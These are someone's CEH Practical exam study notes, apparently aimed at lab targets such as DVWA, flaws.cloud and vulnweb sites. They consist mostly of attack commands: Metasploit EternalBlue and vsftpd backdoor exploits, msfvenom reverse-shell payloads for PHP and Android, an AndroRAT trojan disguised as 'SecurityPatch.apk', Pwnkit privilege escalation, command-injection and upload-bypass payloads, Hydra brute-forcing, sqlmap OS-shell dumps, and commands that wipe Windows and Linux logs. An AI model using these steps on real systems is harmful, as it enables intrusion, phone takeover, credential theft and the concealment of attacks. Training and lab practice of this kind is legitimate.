@@ -1,0 +1,617 @@
+CEH Practical -
+
+Foot Printing & Reconniassance-
+
+
+Digital Certs
+crt.sh - Able to gather Domain Name & Org name etc.
+ctsearch.entrust.com - Able to search for partial or expired certificates
+censys.io - SE for all IOT devices can be used to search digital certs.
+
+DNS Enumeration-
+dig eccouncil.org
+dig ns eccouncil.org - nameservers info
+dig mx eccouncil.org - mail servers info
+
+host eccouncil.org - to get host details
+host -t ns eccouncil.org - nameservers
+
+nslookup eccouncil.org
+
+DNSRECON-
+dnsrecon -d eccouncil.org -t axfr - It automatically scans for NS, MX, A, AAAA, CNAME, Zonetransfers etc.
+
+DNSENUM-
+dnsenum eccouncil.org
+
+FIERCE-
+fierce --domain eccouncil.org
+
+Nmap - ─# nmap -p 53 --script dns-brute demo.testfire.net = auto bruteforces domain name
+Dnsmap - # dnsmap demo.testfire.net -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
+
+Host Discovery-
+
+Netdiscover -> netdiscover -i eth0/eth1(NIC name) = scans whole subnet for live/active hosts
+Nmap -> nmap -sn 10.0.2.1/24 or nmap -sn 10.0.2.0-255 or nmap -sn 10.0.2.* =  scans whole subnet for live/active hosts [-sn/-Pn = ping sweep]
+nmap -sn -PR 10.0.2.* = scans whole subnet for live/active hosts [-PR = Arp scan]
+nmap -sn -PU 10.0.2.* = UDP Ping scan
+nmap -sn -PE 10.0.2.* = ICMP Echo Ping scan
+nmap -sn -PM 10.0.2.* = ICMP Mask Ping scan [if ICMP is blocked]
+nmap -sn -PP 10.0.2.* = ICMP Timestamp Ping scan
+nmap -sn -PS 10.0.2.* = TCP Syn scan
+nmap -sn -PO 10.0.2.* = IP Protocol scan
+
+AngryIP Scanner - GUI tool used for scanning live hosts in a subnet.
+Service Discovery - refers to identifying Open ports & Services running on it.
+OS Discovery - refers to identifying OS running on target system.
+
+sudo nmap -sS -sV 192.168.205.4 = does Stealth scan & Version enum on target IP.
+hping3 -S 192.168.205.4 -p 80 -c 5 [-S = TCP Stealth scan] = used to check whether port 80 is open or not.
+
+nmap -sS -O 192.168.205.4 = To identify OS used
+nmap --script smb-os-discovery.nse 192.168.205.4 = It's a nmap built-in script which uses smb to check for the OS used on target.
+sudo nmap -sS -p 445 -A 192.168.205.4 = It's a one-liner scan results OS, Version, scripts, traceroute etc.
+
+NetBIOS Enumeration-
+It is used for communicating between computers on a LAN.
+It provides services for naming, browsing, sharing resources within a network.
+The UDP Port 137 used for NetBIOS Name Service (NBNS).
+The UDP Port 138 used for NetBIOS Datagram Service, which supports transmission of datagram messages.
+NetBIOS over TCP/IP can use Port 139 for session establishment.
+
+nbtstat -a 192.168.205.4 = Windows command to enum NetBIOS
+nbtstat -c = cache
+nmap -sV -vv --script nbstat.nse 192.168.205.4 = Nmap built-in script command for NetBIOS
+nmap -sU -p 137 --script nbstat.nse 192.168.205.4 = Scans port 137 for NBNS.
+
+SMB Enumeration-
+SMB is a Server Message Block Protocol used for file sharing, printer sharing & communication b/w computers.
+Commonly associated with Microsoft Windows environments.
+SMB operates on TCP/IP.
+TCP Port 445 - It's a primary port used for file sharing & communication. Handles majority of SMB traffic, file access etc.
+UDP Port 137, 138 - These ports are used by SMB for NetBIOS Name Service, Datagram Service.
+TCP Port 139 - It's used by older versions of SMB for session establishment.
+nmap -sV -p 445 -A 192.168.205.4  = Nmap built-in command to scan OS, versions of  port 445.
+nmap -sV --script smb-os-discovery.nse 192.168.205.4 = Nmap command used to check OS using smb discovery script.
+nmap -sV -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 192.168.205.4 = Nmap command used to identify/enumerate smb shares and users
+cd /usr/share/nmap/scripts;ls | grep smb = command used to find smb scripts
+
+Enum4Linux-
+The Enum4Linux is a network enumeration & info gathering tool.
+Enum4Linux leverages various SMB & NetBIOS enum techniques to gather info about target system.
+enum4linux -a 192.168.205.4 = one-liner command used for all data about smb.
+
+Metasploit-
+Metasploit Framework is a set of tools that allows info gathering, scanning, exploitation, post-exploitation etc.
+Primary usage is for Pentesting, VAPT, exploits development.
+Consists 3 parts -
+msfconsole = Main CLI
+modules = Core components which includes payloads, exploits etc
+tools = stand-alone tools help for vuln. research [msfvenom]
+nmap -sC -sV -A 192.168.205.6 = Scan the target system initially.
+sudo msfconsole
+search eternalblue
+use 0/1
+set RHOSTS 192.168.205.6 = Target IP
+set LHOST 192.168.205.5 = Kali IP
+exploit
+after shell is created
+migrate 4652
+screenshot 
+mv /root/bjhbbh.jpeg /home
+
+
+Scanning Networks-
+Types of Scans-
+
+-sn = Ping Sweep/Ping Scan [Disables Port Scanning, only used for HOST Discovery] = fetches all live hosts/IPs in network
+-sT = TCP Connect Scan
+-sS = TCP Stealth Scan [Half-open scan]
+-sU = UDP Scan
+-sF = FIN Scan
+-sX = XMAS Scan [FIN, URG, PSH flags]
+-Pn = [Disables HOST Discovery, used for only Port Scanning] = fetches open ports in a live host
+
+Vulnerability Assessment-
+searchsploit
+Nessus
+
+searchsploit vsftpd 2.3.4
+Install Nessus and configure the target ip and perform scan
+Nessus
+Nessuspwd#007
+
+Exploitation-
+msfconsole
+search vsftpd
+use 0
+set RHOSTS 192.168.205.4 = Target IP
+exploit
+Using the backdoor a shell is created.
+
+Post Exploitation-
+msfconsole
+search eternalblue
+use 0/1
+set RHOSTS 192.168.205.6
+set LHOST 192.168.205.5
+exploit
+Once the shell is created, we can use many commands like keyscan_start, hashdump, screenshot, screenshare etc
+
+FTP Enumeration-
+FTP uses Client-server communication model.
+FTP uses port 21.
+Types of modes of FTP - Active & Passive FTP.
+nmap -sC -sV -A -vv 192.168.2.45 = Scan the host using nmap and check for open ports.
+We can see ftp is open & running.
+Try to login into ftp using - ftp 192.168.2.45
+If it asks for login provide anonymous login & password.
+Check whether we can able to login into it.
+We can login successfully.
+ftp>ls
+Check for the flag and submit it.
+
+If we don't have anonymous login-
+We need to brute-force the ftp login.
+We can use Hydra for it.
+hydra ftp://192.168.205.4 -l anonymous -p /usr/share/wordlists/rockyou.txt -o json (or)
+ hydra -l anonymous -p  /usr/share/wordlists/rockyou.txt ftp://192.168.205.4 
+Here, l=username [anonymous] or we can use wordlist path
+p=Path of wordlist where password can be brute-forced
+We can see the login is brute-forced.
+small p = for direct password
+capital P = for wordlist path
+small l = for direct username
+captial L = for wordlist path
+To attack multiple IPs - Save all IPs in a text file and use -M for it.
+Pwned machines in HTB successfully.
+
+SMB Enumeration-
+SMB is a request-response protocol.
+It uses TCP/IP to connect with servers.
+Samba runs on Unix.
+nmap -sC -A -T4 --script vuln 192.168.205.4 = Here we use --script vuln to check the IP for what it is vulnerable.
+
+TELNET Enumeration-
+Telnet is app protocol which uses telnet client to connect and execute commands on a remote machine that's hosting a telnet server.
+Telnet is replaced by SSH nowadays. Since it is not encrypted.
+telnet 192.168.205.4 23
+Backdoor.....reverse meterpreter etc
+
+Escalate Privileges by exploiting using pkexec vulnerability-
+whoami
+sudo -l
+Search for Linpeas
+Copy curl command and run in terminal
+RED or YELLOW - 95% Priv Esc can be done.
+Check for CVE-2021-4034 Pwnkit
+Search for Pwnkit and git clone the link in /tmp folder
+ls
+cd CVE-2021-4034/
+ls
+make
+ls
+whoami
+./cve-2021-4034
+whoami
+root
+Thus we escalate from normal/attacker user to root user
+
+
+Escalate privileges in linux using misconfigured NFS-
+NFS is a Network File System is a protocol enables users to access files remotely thru a network.
+PDF Downloaded
+
+Covert TCP-
+It is used to send the one byte at a time from any host to destination.
+It can act like a server and client.
+Can be used to hide data transmitted inside an IP Header
+This helps in bypassing firewalls and sending data
+PDF Downloaded
+
+Hiding exe file in txt file - PDF Downloaded
+
+SNOW Tool- white space steganography
+Download SNOW and navigate to its folder.
+Create a text file named test with a Hello world text in it.
+Open cmd in snow folder path and type - SNOW.EXE -C -m "This is a secret message" -p "1234" test.txt demo.txt
+The above text message is inserted in demo file hidden inside with a password
+If we open Hello world can be seen, with other text hidden
+To retrieve hidden text type - SNOW.EXE -C -p "1234" demo.txt
+Thus, hidden text is displayed.
+
+OPENSTEGO - Image steganography
+Here we can use Openstego tool to embedd secret text in an image.
+Else Stegonline can be used.
+
+DVWA Pentesting-
+Install DVWA in Kali & Windows.
+Reset database
+Choose Command Injection vuln
+For Kali - 
+Low - 127.0.0.1 && ls
+Medium - 127.0.0.1 | ls
+High - 127.0.0.1 |ls
+
+For Windows -
+Low - |localhost
+Medium - |whoami
+High - |type c:\"pin.txt"
+
+FileUpload-
+Open metasploit
+search handler
+Choose exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+run
+
+type - msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
+
+If it doesn't allow to upload php files then intercept using burp and modify content-type from jpeg to application/x-php.
+Then it allows the file, copy path and paste in URL.
+Check meterpreter session
+We can see reverse shell is created
+
+If it checks for extension even after modifying in burp then do belo things-
+Open your exploit.php file using nano and add GIF89a; at first line of your payload file, and rename file as exploit.php.JPEG
+Then it gets uploaded into it.
+Now rename back to .php using this command - | mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg" "/usr/share/dvwa/hackable/uploads/exploit.php"
+Insert this into Command Injeciton tab.
+And similarly, create meterpreter reverse_tcp  session to check whether shell is created.
+
+Brute-Forcing using Burp Intruder & Hydra:
+Here we use intruder to brute-force the login creds. - Low, Medium
+We use pitch fork, 2 payload sets with SESSIONID customization settings  -High
+
+Using Hydra-
+Hydra -l admin -P /usr/share/wordlists/john.list 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSIONID=_________________;security=high:F=Username and/or password incorrect'
+
+SQLMAP Room Pwned in THM-
+We use FFUF or Gobuster to check for directories available.
+We crawl the found directories.
+We perform sqlmap for dbs, tables etc by copying request in a text file.
+
+WPScan-
+
+
+
+
+DSSS-
+Damn small sqli scanner is a fully functional SQL Injection vuln. scanner that supports GET & POST parameters.
+Open target site-moviescope.com 
+Open console type document.cookie() and copy cookie
+Open Terminal > cd dsss > ls 
+> python3 dsss.py -u "https://moviescope.com/viewprofile.aspx?id=1" --cookie="_______" 
+Shows Get parameter with ?id=1 is vulnerable to SQLInjection
+Copy & paste link in browser.
+
+OpenVAS-
+Use kali/parrot as attacking machine and windows as target.
+Open OpenVAS Greenbone security assistant in parrot and it opens a terminal.
+Navigate to 127.0.0.1:9392 sign in as admin/password.
+Scans > Tasks > New Tasks >Enter IP address of windows machine.
+Once it is done resuslts consisting vulnerabilities can be viewed.
+
+CGI Scanner-
+nikto
+nikto -h
+nikto -h google.com -Tuning x
+nikto -h google.com -Cgidirs all
+
+
+John the Ripper-
+
+Use hydra to bruteforce login page - hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.159.15 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username" or password invalid" -V -I -t 4
+It finds the password
+Now copy the RSA private key in a text file and edit, save using nano.
+ssh2john is a command used to convert text file into hash file.
+ssh2john key.txt > hash.txt
+ls
+john hash.txt -w=/usr/share/wordlists/john.lst
+john hash.txt --show
+john hash.txt -w=/usr/share/wordlists/rockyou.txt
+cp key.txt key.pem
+chmod 600 key.pem
+ssh -i key.pem admin@IP
+enter passphrase as password
+ls
+cat user.txt
+
+Malware Analysis-
+4 types of malware analysis - Static, Dynamic, Code, Behavioural analysis
+Can do Hybrid analysis to analyze suspicious files
+BinText ???
+PEid tool for obfuscation??
+ELF file using DIE (Detect It Easy)
+
+Dependency Walker Tool-
+Malware DIsassembling using IDA-
+Malware Disassembling using OllyDbg-
+Malware Disassembling using Ghidra-
+Hacking victim using njRAT Trojan -
+Creating trojan server using Theef RAT Trojan -
+Creating Virus using JPS Virus Maker tool -
+
+Wireshark-
+Sniffing credentials using Wireshark from http, ftp protocols.
+Open Wireshark running, Open target website and capture packets
+Login into the website using credentials
+Now Filter http.request.method==POST in display filter
+Because Creds are sent in a POST request.
+We can see creds in plain text in  urlencoded-form as it uses http protocol.
+
+Detect DDOS attack using Wireshark-
+Open pcap file and filter using this - tcp.flags.syn ==1 and tcp.flags.ack == 0 -> Which means 3 Way Handshake is not done and only SYN Packets are being sent. And also check the number = 30000
+Else try tcp.flags.syn ==1 and tcp.flags.ack == 1 -> To check how many ack are received. Here number = 0
+Which indicates DDOS attack is performed.
+Try another method checking conversation -> Ipv4 = We can see Address B Ip is constant. Which seems DDOS.
+Check for I/O graph sudden spikes which indicates DDOS is performed.
+
+Capturing IOT Devices Traffic-
+Open pcap file and filter mqtt
+Check for Publish Message in the packets.
+We can see hidden text is displayed in the packet.
+Thus we sniff IOT traffic.
+
+
+Hacking Android Devices-
+Using Msfvenom-
+msfvenom -l payloads | grep android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.20.131 LPORT=4444 -f raw>file.apk
+python3 -m http.server
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+options
+set LHOST kali Ip address
+run
+
+Go to kali http://IP:8000 in android browser and download file.apk and install it.
+We can see meterpreter session gets created/ shell is created.
+
+Using Phonesploit-
+Enable developer tools
+sudo nmap -sS -p- -Pn Android IP
+We can see port 5555 is open which is android
+sudo apt install adb
+git clone Phonesploit
+cd Phonesploit
+python3 -m pip install colorama
+python3 phonesploit.py
+Enter Android device IP to get shell
+
+Phishing using SEToolkit
+
+
+Wifi Hacking-
+WEP - Weak encryption - Not used anymore
+WPA/WPA2 - 99% used
+WPA3 - New standard
+AP - Access Point = Router
+MAC - Media Access Control [MAC Address]
+BSSID - Access point's MAC Address
+ESSID - Access point's broadcast name
+Aircrack-ng tool used to do wifi-hacking
+THey will provide captured file in exam, use it to find password by cracking
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [Mac address] pass*.cap
+Open folder and copy password file into sample captures folder
+open terminal
+aircrack-ng WEPcrack-01.cap
+KEY FOUND! [________]
+aircrack-ng WPA2crack-01.cap -w password.txt
+KEY FOUND! [________]
+
+For WEP password file not required, only for WPA/WPA2 required
+
+Capture Handshakes with HCXdumptool- PDFs
+
+Cracking WiFi Passwords using Hashcat tool - PDFs
+
+Cracking WiFi Passwords using Fern- PDFs
+
+Enumerating S3 Buckets-
+Using lazys3-
+git clone lazys3
+cd lazys3
+ruby lazys3.rb certifiedhacker
+
+Using cloud_enum-
+sudo apt install cloud-enum
+cloud_enum -h
+cloud_enum -k certifiedhacker --disable-azure --disable-gcp
+
+Using S3 Buck Extension-
+Download Zip code
+Extract
+Load unpacked extension
+
+Exploiting Unauthenticated S3 buckets-
+aws s3 ls s3://flaws.cloud/ --no-sign-request
+copy the flag/secret text
+aws s3 cp s3://flaws.cloud/secret-6465.html .--no-sign-request
+If we have write access then we can upload file into s3 bucket -
+ aws s3 cp ./index.html s3://flaws.cloud --no-sign-request
+
+Exploiting Authenticated S3 Buckets-
+For this we need to have AWS account
+aws s3 ls s3://level2-c654c54c2c1.flaws.cloud/ --no-sign-request
+Error -Access Denied
+Login to AWS account >IAM > Add user >Provide permissions > Save access key & Secret access key
+aws configure --profile siddanthi
+Akey-_____
+SAkey-_________
+aws s3  --profile siddanthi ls  s3://level2-c654c54c2c1.flaws.cloud/
+Error -Access denied
+Now in Aws add S3 bucket access in policies
+Now we can able to exploit auth s3 bucket
+aws s3  --profile siddanthi ls  s3://level2-c654c54c2c1.flaws.cloud/
+secret-64554.html
+cat secret-5432.html
+
+Disk encryption using Veracrypt-
+
+VeraCrypt is a free, open-source disk encryption software available for Windows, Mac OSX, and Linux. It's the successor to TrueCrypt and has been enhanced to offer better security features. 
+With VeraCrypt, you can create a virtual encrypted disk within a file or encrypt an entire partition or storage device. It's designed to encrypt data on-the-fly, meaning that it automatically 
+encrypts and decrypts data as it is loaded and saved, without user intervention
+.
+The main reason to use VeraCrypt is to secure sensitive data. For CISOs, it ensures that confidential company information, customer data, and intellectual property remain inaccessible to hackers and unauthorised personnel.
+
+Cryptoforge & Aeppro
+Tool used to encryp/decrypt files
+
+Encryption/Decryption using BCTextEncoder-
+Simple usage
+
+Calculating Hashes-
+Using Hashcalc, Hashmyfiles, MD5 Calcu
+
+Sql Map in Detail-
+
+We can directly insert sqli payloads into website and check whether web app is vulnerable for sqli.
+Else to dump data we can intercept request and copy it to file and run sqlmap against it.
+
+In Linux-
+sqlmap -r request.txt --dbs = It dump all databases
+sqlmap -r request.txt -D blood --tables = It dumps all existing tables in a blood database.
+sqlmap -r request.txt -D blood -T users --dump = It dump all data present in users table.
+
+In Windows/cmd-
+python sqlmap.py -r request.txt --dbs
+python sqlmap.py -r request.txt -D blood --tables 
+python sqlmap.py -r request.txt -D blood -T users --dump
+
+Using cookie command-
+
+Windows - python sqlmap.py --cookie="test%2Ftest" -u "http://testphp.vulnweb.com/userinfo.php" --level 3 --dbs
+Linux - sqlmap --cookie="test%2Ftest" -u "http://testphp.vulnweb.com/userinfo.php" --dbs
+Linux - sqlmap --cookie="test%2Ftest" -u "http://testphp.vulnweb.com/userinfo.php" -D [____] --tables
+Linux - sqlmap --cookie="test%2Ftest" -u "http://testphp.vulnweb.com/userinfo.php" -D [____] -T [_____] --dump
+
+Brute-forcing Login Page using Hydra-
+
+testphpvulnweb -  hydra -l test -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
+-l = username
+-P = Password wordlist path
+Target URL
+http-post-form
+
+Exploit Open S3 buckets using aws-cli
+
+sudo su
+pip3 install awscli
+aws --help
+aws configure
+It asks for Access Key Id, Secret Access Key Id etc details
+For it you need to login to AWS account as a root user
+Security Creds > Access keys > Create
+Enter creds
+aws s3 ls s3://certifiedhacker1
+certifiedhacker1.s3.amazonaws.com - google it
+You can upoad files into s3 buckets
+
+Escalating IAM user privileges using misconfigured user policy
+
+Hacking Android Device using apk file created using AndroRAT
+cd AndroRAT
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityPatch.apk
+i=local Ip address
+cp /home/attacker/AndroRAT/SecurityPatch.apk /var/www/html/share
+If not copied to apache server then try -
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+Open android and search http://10.10.1.13/share
+Download and install apk
+We can see meterpreter session gets created
+>help
+>deviceInfo
+>getSMS inbox
+>getMACAddress
+
+Hacking android device by creating binary payloads using Parrotsec-
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > /var/www/html/share/Backdoor.apk
+LHOST=Parrotsec IP
+Download Backdoor.apk and install
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+exploit -j -z
+
+We can see after installing Backdoor a shell gets created
+>session -i 1
+>sysinfo
+
+SQL Injection attack in a website-
+login to app.
+View profile URL
+document.cookie in console
+sqlmap -u "URL" --cookie="cookie value" --dbs
+Dumps all databases
+sqlmap -u "URL" --cookie="cookie value" -D moviescope --tables
+Dumps all tables
+sqlmap -u "URL" --cookie="cookie value" -D moviescope -T Users dump
+Dumps table details
+sqlmap -u "URL" --cookie="cookie value" --os-shell
+
+Finding SQLi Vuln. using OWASP ZAP-
+
+Recon using Nmap & Telnet-
+nmap -T4 -A -v www.moviescope.com
+telnet www.moviescope.com 80
+GET /HTTP/1.0 
+
+Gain access using Log4j vulnerability-
+
+sudo su
+sudo apt-get install docker.io
+cd log4j-shell-poc/
+docker build -t log4j-shell-poc
+docker run --network host log4j-shell-poc
+
+Open parrotsec http://10.10.1.9:8080
+sudo su
+tar -xf jdk-8u202-linux-x64.tar.gz
+mv jdk1.8.0_202 /usr/bin
+etc refer PDF
+
+Concentrate more on Hacking Web apps & Malware threats & Sys Hacking
+
+Recon using Netcat & Telnet-
+nc -v www.moviescope.com 80
+GET / HTTP/1.0
+telnet www.moviescope.com 80
+GET / HTTP/1.0
+
+Scripting using Nmap-
+nmap -sV --script=http-enum www.moviescope.com
+nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostnamp- demo.testfire.net
+nmap --script http-trace -d demo.testfire.net
+nmap -p 80 --script http-waf-detect demo.testfire.net
+
+
+Analyze ELF File using Detect It Easy(DIE) tool-
+
+Open DIE app
+Choose ELF Testfile virus 
+It auto scans the Virus file
+You can check file info, Entropy etc
+
+Escalating Privileges in Linux by Exploiting Misconfigured NFS- Video
+
+Clearing Windows Logs-
+CEH Tools > Sys Hacking > Covering tracks > Run Clearing event logs batch file as Admin
+Open CMD as Admin > wevtutil el
+wevtutil cl system
+
+Clearing Linux logs using Bash shell-
+export HISTSIZE=0
+history -c
+shred ~/.bash_history
+more ~/.bash_history
+shred~/.bash_history && history -c && exit
